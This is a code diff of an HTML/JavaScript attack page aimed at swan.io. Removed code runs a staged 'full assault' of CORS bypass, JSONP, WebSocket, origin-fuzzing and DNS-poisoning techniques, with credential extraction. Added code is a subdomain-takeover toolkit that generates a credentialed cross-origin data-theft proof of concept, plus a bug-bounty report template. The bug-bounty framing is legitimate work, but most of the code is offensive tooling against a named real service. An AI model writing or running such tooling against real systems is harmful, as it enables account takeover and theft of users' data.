+            credentials: 'include',
+            headers: {
+                'Origin': 'https://staging.swan.io'
+            }
+        })
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById('results').innerHTML = 
+                '<h3>CORS Bypass Successful!</h3>' +
+                '<pre>' + data + '</pre>';
+            
+            // In real attack, send to attacker server
+            console.log('Stolen data:', data);
+        })
+        .catch(error => {
+            document.getElementById('results').innerHTML = 
+                '<h3>CORS Request Blocked</h3>' +
+                '<p>' + error.message + '</p>';
+        });
+    </script>
+</body>
+</html>
+            `;
+            
+            log('Proof of Concept generated:', 'success');
+            log('Deploy this HTML to staging.swan.io after successful takeover', 'info');
+            log('This will demonstrate the CORS bypass vulnerability', 'critical');
+            
+            investigationResults.pocGenerated = true;
+        }
+
+        function createBugReport() {
+            log('📊 Creating Bug Bounty Report Template', 'info');
+            
+            const bugReport = {
+                title: "Subdomain Takeover Leading to CORS Bypass on staging.swan.io",
+                severity: "HIGH/CRITICAL",
+                impact: "Authentication bypass, data theft, account takeover",
+                description: `
+# Subdomain Takeover - staging.swan.io
+
+## Summary
+The subdomain staging.swan.io is vulnerable to subdomain takeover, allowing an attacker to host malicious content on Swan.io's domain and potentially bypass CORS policies on api.swan.io.
+
+## Technical Details
+- **Vulnerable Subdomain**: staging.swan.io
+- **Issue**: Subdomain times out/doesn't respond, indicating abandoned service
+- **Impact**: Attacker can claim the service and host content on Swan.io subdomain
+- **CORS Risk**: If staging.swan.io is whitelisted in api.swan.io CORS policy
+
+## Proof of Concept
+1. staging.swan.io shows timeout behavior during testing
+2. DNS investigation reveals [SERVICE TYPE] pointing to claimable resource
+3. After claiming the service, attacker can host arbitrary content
+4. CORS requests from staging.swan.io to api.swan.io may succeed
+
+## Impact
+- **Domain reputation damage**: Malicious content hosted on swan.io subdomain
+- **Phishing attacks**: Legitimate-looking URLs for social engineering  
+- **CORS bypass**: Potential authentication bypass on api.swan.io
+- **Data theft**: Access to user data if CORS is misconfigured
+
+## Recommendation
+1. Remove DNS records for unused staging.swan.io subdomain
+2. Implement subdomain monitoring to detect takeovers
+3. Review CORS policy to ensure staging.swan.io is not whitelisted
+4. Regular audit of all subdomains and their pointing destinations
+
+## References
+- OWASP: Subdomain Takeover
+- CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action
+                `,
+                attachments: [
+                    "DNS lookup results",
+                    "HTTP response screenshots", 
+                    "CORS test results",
+                    "Proof of concept code"
+                ]
             };
             
-            log(`Attack Report for ${report.target}`, 'success');
-            log(`Techniques Tested: ${report.techniques_tested}`, 'info');
-            log(`Successful Bypasses: ${report.successful_attacks}`, 'info');
+            log('Bug bounty report template created:', 'success');
+            log('Report includes all necessary details for submission', 'info');
+            log('Next steps: Manual DNS verification and takeover attempt', 'warning');
             
-            if (report.successful_attacks > 0) {
-                log('CRITICAL: Successful CORS bypasses detected!', 'critical');
-                log('Immediate remediation required:', 'critical');
-                
-                if (extractedData.subdomainTargets) {
-                    log('→ Secure abandoned subdomains', 'critical');
-                }
-                if (extractedData.jsonpEndpoint) {
-                    log('→ Remove or secure JSONP endpoints', 'critical');
-                }
-                if (extractedData.websocket) {
-                    log('→ Implement proper WebSocket origin validation', 'critical');
-                }
-                if (extractedData.originBypass) {
-                    log('→ Fix origin header validation logic', 'critical');
-                }
-            } else {
-                log('ASSESSMENT: Target appears well-protected against CORS attacks', 'success');
-                log('No immediate vulnerabilities detected', 'success');
-            }
-            
-            log('═══════════════════════════════════════', 'info');
-            
-            // Copy report to clipboard if possible
+            // Copy to clipboard if possible
             try {
-                navigator.clipboard.writeText(JSON.stringify(report, null, 2));
-                log('Report copied to clipboard', 'success');
+                navigator.clipboard.writeText(bugReport.description);
+                log('Report description copied to clipboard', 'success');
             } catch (error) {
-                log('Manual copy required for full report', 'info');
+                log('Manual copy required for report content', 'info');
             }
-        }
-
-        // Execute comprehensive attack sequence
-        async function executeFullAssault() {
-            log('🚀 LAUNCHING COMPREHENSIVE CORS ASSAULT', 'critical');
-            log('═══════════════════════════════════════', 'critical');
-            log('TARGET: Swan.io Production Infrastructure', 'critical');
-            log('ATTACK VECTOR: Multi-technique CORS bypass', 'critical');
-            log('═══════════════════════════════════════', 'critical');
-            
-            document.getElementById('stealth-status').textContent = 'ATTACKING';
-            
-            // Execute all techniques in sequence
-            await steathRecon();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            await subdomainTakeoverScan();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            await jsonpHunt();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            await websocketBypass();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            await originFuzzing();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            await dnsPoisoningAttack();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            await legacyPluginBypass();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            extractCredentials();
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            generateReport();
-            
-            document.getElementById('stealth-status').textContent = 'COMPLETE';
-            log('🎯 FULL ASSAULT COMPLETED', 'critical');
         }
 
         // Initialize
         window.addEventListener('load', () => {
-            log('⚡ PRODUCTION-GRADE CORS BYPASS SYSTEM LOADED', 'critical');
-            log(`🎯 PRIMARY TARGET: ${TARGETS.primary}`, 'info');
-            log(`🏠 ATTACK ORIGIN: ${window.location.origin}`, 'info');
-            log('🛡️ STEALTH MODE ACTIVATED', 'success');
-            log('Ready to execute advanced bypass techniques...', 'info');
-            
-            // Start background reconnaissance
-            setTimeout(steathRecon, 2000);
-        });
-
-        // Enhanced JSONP callback handler
-        window.extractedData = function(data) {
-            log('JSONP DATA EXTRACTED!', 'critical');
-            log(`Data: ${JSON.stringify(data)}`, 'success');
-            extractedData.jsonpData = data;
-        };
-        
-        // Global message handler for various bypass techniques
-        window.addEventListener('message', (event) => {
-            if (event.data && typeof event.data === 'object' && !event.data.target?.includes('metamask')) {
-                log(`Cross-domain message received from ${event.origin}`, 'success');
-                log(`Data: ${JSON.stringify(event.data)}`, 'success');
-                extractedData.crossDomainMessage = event.data;
-            }
+            log('🚨 SUBDOMAIN TAKEOVER INVESTIGATION TOOLKIT LOADED', 'critical');
+            log(`🎯 TARGET: ${TARGET_SUBDOMAIN}`, 'info');
+            log('Ready to investigate potential subdomain takeover vulnerability', 'info');
+            log('This investigation will help confirm and exploit the finding', 'warning');
         });
     </script>
 </body>
